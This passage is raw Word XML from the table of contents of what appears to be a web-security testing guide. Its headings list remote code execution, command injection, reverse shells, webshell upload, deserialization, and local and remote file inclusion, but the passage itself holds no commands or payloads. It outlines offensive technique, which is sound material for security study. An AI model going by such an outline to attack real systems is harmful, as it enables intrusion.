            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408667" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Remote Code Execution (RCE)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408667 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>50</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="25C02DF9" w14:textId="49413EFD" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408668" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Types of RCE</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408668 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>50</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="58B08039" w14:textId="77DF4D29" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408669"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_Toc208408669 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>50</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0633F196" w14:textId="31BBA45A" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408670" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exploitation Techniques</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408670 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>50</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="11C7CA08" w14:textId="4CC47C9B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408671" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>OS Command Injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408671 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>50</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="389E53C6" w14:textId="2BB50674" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408672" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Reverse Shells</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408672 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>50</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2D00959E" w14:textId="5F6357AD" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408673" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Webshell Upload</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408673 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0A789B34" w14:textId="63229D56" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408674" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exploiting Deserialization</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408674 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4FE6D456" w14:textId="4CE70CC1" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408675" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Indicators of RCE Vulnerability</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408675 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="656CB4CA" w14:textId="18758192" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408676" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Tools</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408676 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1660A983" w14:textId="4DC59400" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408677"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_Toc208408677 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1553D14C" w14:textId="346FB061" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408678" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>File Inclusion</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408678 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4B9107C2" w14:textId="71F79EBC" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408679" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Attack Surface</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408679 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="15E36B54" w14:textId="3E2A7E3C" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408680" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exploitation Techniques</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408680 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="509944CA" w14:textId="6269907A" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408681" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Local File Inclusion (LFI)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408681 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="22F0D9F8" w14:textId="3BC53C5B" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408682" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Remote File Inclusion (RFI)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408682 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0CE6B7BE" w14:textId="30DA372D" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408683" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>LFI → RCE Escalation</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408683 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0A23B3CB" w14:textId="584AEEC4" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
